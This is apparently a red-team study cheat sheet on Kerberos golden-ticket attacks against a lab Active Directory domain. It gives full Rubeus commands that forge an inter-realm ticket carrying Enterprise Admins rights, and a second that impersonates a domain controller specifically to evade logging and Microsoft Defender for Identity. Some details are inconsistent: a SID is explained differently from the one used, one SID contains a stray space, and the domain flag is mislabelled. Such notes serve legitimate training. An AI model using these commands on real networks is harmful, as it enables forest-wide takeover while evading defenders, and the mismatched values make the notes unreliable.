# Methodology
>1. 

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerView

---
# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](../00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Rubeus

**Forge an interrealm golden ticket:**
```cmd
Rubeus.exe golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-2781415573-3701854478-2406986946 /krbtgt:a6215eeb238da9262d014a529fe03adb /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /groups:513 /ptt /nowrap
```

where:
- `golden` - Specifies Golden Ticket attack mode in Rubeus
- `/user` - Specifies the username to impersonate (e.g., `Administrator`)
- `/domain` - Targets the forest root domain (e.g., `us.techcorp.local`)
- `/sid` - Provides the current domain's SID
- `/krbtgt` - Uses the NTLM hash of the child domain's KRBTGT account
- `/sids` - Adds Enterprise Admins group SID (`-519`) for forest-wide privileges
- `/ptt` - Injects ticket directly into memory (Pass-the-Ticket)
- `/nowrap` - Outputs ticket without base64 line wrapping

**Avoid suspicious logs and bypass MDI by using Domain Controller identity:**
```cmd
Rubeus.exe golden /user:us-dc$ /id:1000 /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1- 5-21-2781415573-3701854478-2406986946-516,S-1-5-9 /aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58CACD5 /dc:us-dc.us.techcorp.local /ptt
```

where:
- `S-1-5-21-2578538781-2508153159-3419410681-516` – Domain Controllers 
-`S-1-5-9` – Enterprise Domain Controllers